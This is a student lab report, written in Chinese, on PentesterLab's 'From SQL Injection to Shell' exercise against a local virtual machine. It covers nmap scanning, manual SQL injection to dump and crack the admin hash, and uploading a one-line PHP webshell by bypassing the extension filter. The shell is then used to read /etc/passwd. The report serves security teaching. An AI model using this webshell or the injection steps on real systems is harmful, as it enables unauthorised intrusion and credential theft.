# Chap0x07 从SQL注入到Shell

## 实验要求

- 了解SQL注入和Webshell并完成相关实验

## 环境搭建

- 从PentesterLab提供的 https://pentesterlab.com/exercises/from_sqli_to_shell/iso 网址上下载靶机镜像，该镜像实质是一个Debian服务器。
  - 安装完毕后：![](img/0.png)
- 网络配置
  - 靶机和攻击者均选择Host-only网卡，设置攻击者Host-only网卡的ipv4地址与靶机在同一网段，设置完毕之后，用`ifconfig`查看网卡配置信息
    - 攻击者：![](img/2.png)
    - 靶机：![](img/37.png)
- 连通性测试，在攻击者主机上ping靶机：`ping 192.168.142.3`
  - ![](img/5.png)
- 攻击者使用`netdiscover`扫描网段，确保靶机在网段中
  - ![](img/6.png)
  - 其中参数`-r`的作用是指定ip地址的范围（range的缩写）
- 攻击者使用`nmap -sP 192.168.142.0/24`扫描网段，确保靶机在网段中（与netdiscover作用一致，参考了两位同学的做法）
  - ![](img/3.png)
- 确认网段中含有靶机ip后，攻击者使用`nmap -A 192.168.142.3`扫描靶机的开放端口
  - ![](img/4.png)
- 获得靶机开放端口后，攻击者使用`telnet 192.168.142.3 80`尝试与靶机的80端口建立连接
  - ![](img/8.png)

## 实验过程

- 攻击者访问`192.168.142.3`，将出现如下克苏鲁小怪

  - ![](img/1.png)

- `ctrl+F12`查看网页源码，找到其中包含php的链接

  - ![](img/7.png)

- 尝试访问上一步发现的php链接
  - all.php：![](img/11.png)
  - cat.php?id=1：![](img/12.png)
  - cat.php?id=2：![](img/13.png)
  - cat.php?id=3：![](img/14.png)

- 寻找SQL注入点
  1. 在参数id的值后加上`'`，可以观察到抛出的错误，可以得到使用的SQL语言为MySQL
     -  ![](img/15.jpg)
  2. 在参数后加上`or 1=1`，确认是否存在SQL漏洞
     - 三张图片都显示，说明存在SQL漏洞
     - ![](img/17.png)
  3. 使用`UNION`，枚举列数
     - ![](img/38.png)
     - ![](img/39.png)
  4. 使用`ORDER BY`，枚举列数
     - ![](img/18.png)
     - ![](img/19.png)
  5. 获取信息
     - 使用`database()`、`current_user()`和`version`
     - 如果没有使用正确的列，无法获取正确的信息
       - ![](img/40.png)
     - 经检测，列2可显示正确的信息
       - ![](img/20.png)
       - ![](img/21.png)
       - ![](img/22.png)
     - 查看所有的表名、列名
       - 表名：![](img/23.png)
       - 列名：![](img/27.png)
  6. 查找管理员密码
     - ![](img/26.png)
     - 得到密码的哈希值
  7. 破解密码（两种方法）
     - 用搜索引擎在线破译
       - ![](img/28.png)
     - 使用john工具
       - ![](img/29.png)
  8. 得到管理员密码后，登录
     - ![](img/30.png)
     - ![](img/31.png)
     - done，可以对文件进行各类增删改的操作了

- WebShell

  1. 按照PentesterLab的教程，先创建一个php文件

     - ```php
       <?php
         system($_GET['cmd']);		// 用于运行命令行指令
       ?>
       ```

  2. 试着将它直接上传到靶机服务器上

     - ![](img/32.png)
     - 失败，不接收php文件

  3. 重命名我的`test.php`，在末尾再加上一个`.test`，再次上传

     - 成功，`ctrl+F12`查看页面源码结果如下：
     - ![](img/33.png)

  4. 现在，可以在地址栏输入各种命令行指令查看运行效果了

     - `cmd=cat /etc/passwd`
       - ![](img/34.png)
     - `cmd=uname -a`
       - ![](img/35.png)
     - `cmd=ls`
       - ![](img/36.png)

## 遇到的问题

- 靶机刚安装的时候虚拟机没有为其自动分配ipv4地址，后来发现是因为没有在管理页启动DHCP服务器

  - 管理->主机网络管理器->DHCP服务器启用
  - ![](img/41.png)

- 使用`telnet 192.168.142.3 80`的时候，由于回车没有敲对，出现了`400 bad request`的报错，在stackoverflow上看到了回车的正确姿势

  - ```
    telnet www.bing.com 80   (press ENTER twice!!!)
    GET / HTTP/1.1      (press ENTER)
    Host: www.bing.com  (press ENTER twice!!!)
    ```

- 试用john破译md5的时候，一开始没有使用rockyou.txt，导致运行了20分钟仍然没有得到结果，后来使用了rockyou.txt，使用内置的字典，秒得结果= =

## 参考资料

- [400-bad-request](https://stackoverflow.com/questions/16143869/telnet-with-bad-request-400)
- [PentesterLab](https://pentesterlab.com/exercises/from_sqli_to_shell)
- [SunnyCCC实验报告](https://github.com/CUCCS/2018-NS-Public-SunnyCcc/blob/1d164edc56524b59305b778d205ff1f88e19d0b8/ns-0x07/cha%200x07%20SQL%E6%B3%A8%E5%85%A5%20Webshell.md)
- [Jckling实验报告](https://github.com/CUCCS/2018-NS-Public-jckling/blob/0aacd954db698f695fcd4d37ebde76f579df1160/ns-0x07/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.md)
- [kali使用john的指南](https://blog.csdn.net/wizardforcel/article/details/52858046)